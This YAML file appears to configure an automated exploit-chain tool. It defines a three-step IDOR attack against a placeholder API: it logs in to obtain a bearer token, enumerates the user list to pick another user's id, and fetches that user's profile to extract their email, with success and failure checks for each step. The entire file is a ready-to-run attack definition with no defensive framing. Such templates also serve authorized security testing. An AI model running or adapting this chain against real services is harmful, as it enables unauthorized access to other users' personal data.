exploit_chain:
  name: "IDOR User Data Extraction"
  description: "Exploit IDOR to access another user's data."
  steps:
    - name: "Login as User"
      description: "Authenticate and extract token."
      request_config:
        method: "POST"
        url: "https://api.example.com/login"
        json_data:
          username: "victim"
          password: "password123"
      success_indicators:
        - "status_code == 200"
        - "token in response.json"
      data_extractors:
        token: "json:token"
    - name: "Enumerate Users"
      description: "Get user list with token."
      request_config:
        method: "GET"
        url: "https://api.example.com/api/users"
        headers:
          Authorization: "Bearer {{token}}"
      success_indicators:
        - "status_code == 200"
        - "users in response.json"
      data_extractors:
        target_user_id: "json:users.1.id"
    - name: "Access Another User's Data"
      description: "Exploit IDOR to access data of another user."
      request_config:
        method: "GET"
        url: "https://api.example.com/api/users/{{target_user_id}}/profile"
        headers:
          Authorization: "Bearer {{token}}"
      success_indicators:
        - "status_code == 200"
        - "py:'email' in response.text and 'admin' not in response.text"
      failure_indicators:
        - "forbidden"
        - "unauthorized"
      data_extractors:
        target_email: "json:email" 